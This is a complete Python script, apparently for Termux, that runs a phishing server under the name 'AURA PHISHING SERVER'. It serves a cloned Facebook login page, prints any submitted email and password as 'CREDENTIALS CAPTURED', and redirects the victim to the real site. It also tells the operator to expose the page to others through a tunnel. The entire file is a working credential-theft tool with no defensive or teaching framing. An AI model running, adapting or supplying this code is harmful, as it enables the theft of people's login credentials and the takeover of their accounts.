#!/usr/bin/env python3
import socket
import threading
import subprocess
import re
import sys

# --- Helper to get the Termux IP Address ---
def get_termux_ip():
    """Finds the Termux app's IP address on your local network."""
    try:
        # Run the 'ip' command we just installed
        result = subprocess.run(['ip', '-4', 'addr', 'show', 'wlan0'], capture_output=True, text=True)
        # Use regex to find the IP address (e.g., 192.168.1.100)
        match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', result.stdout)
        if match:
            return match.group(1)
    except Exception:
        pass
    # Fallback to 0.0.0.0 if the IP can't be found
    return '0.0.0.0'

# --- The Phishing Server Code ---
LOCAL_IP = get_termux_ip()
HOST = '0.0.0.0' # Listen on all network interfaces
PORT = 8080

print("\n" + "="*50)
print("     AURA PHISHING SERVER (RELIABLE EDITION)")
print("="*50 + "\n")
print(f"[+] Your Termux IP address is: {LOCAL_IP}")
print(f"[+] To test on YOUR phone, open: http://{LOCAL_IP}:{PORT}")
print(f"[+] To share with others, use a tunnel (Cloudflared/Bore).")
print("[+] Waiting for credentials...\n")

def handle_client(client_socket):
    try:
        request = client_socket.recv(4096).decode()
        if 'POST' in request:
            body = request.split('\r\n\r\n')[1]
            print(f"\n[!] CREDENTIALS CAPTURED!")
            print(f"    {body.replace('&', '\n    ')}\n")
            response = "HTTP/1.1 302 Found\r\nLocation: https://facebook.com\r\n\r\n"
        else:
            html = '''<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body { font-family: Arial; background: #f0f2f5; text-align: center; padding-top: 100px; }
        .box { background: white; width: 400px; margin: auto; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; }
        button { background: #1877f2; color: white; padding: 12px; width: 95%; border: none; border-radius: 4px; font-size: 16px; }
        h2 { color: #1877f2; }
    </style>
</head>
<body>
<div class="box">
    <h2>facebook</h2>
    <form method="POST">
        <input type="text" name="email" placeholder="Email or Phone" required><br>
        <input type="password" name="pass" placeholder="Password" required><br>
        <button type="submit">Log In</button>
    </form>
</div>
</body>
</html>'''
            response = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n" + html
        client_socket.send(response.encode())
    except:
        pass
    finally:
        client_socket.close()

try:
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[+] Server successfully started on {LOCAL_IP}:{PORT}")
    print("[+] Press Ctrl+C to stop the server.\n")

    while True:
        client, addr = server.accept()
        threading.Thread(target=handle_client, args=(client,)).start()
except OSError as e:
    if e.errno == 98:
        print(f"[!] Error: Port {PORT} is already in use.")
        print("[!] Run 'pkill -f python' to stop the other server and try again.")
    else:
        print(f"[!] An error occurred: {e}")
    sys.exit(1)
except KeyboardInterrupt:
    print("\n[+] Server stopped.")
    server.close()
    sys.exit(0)
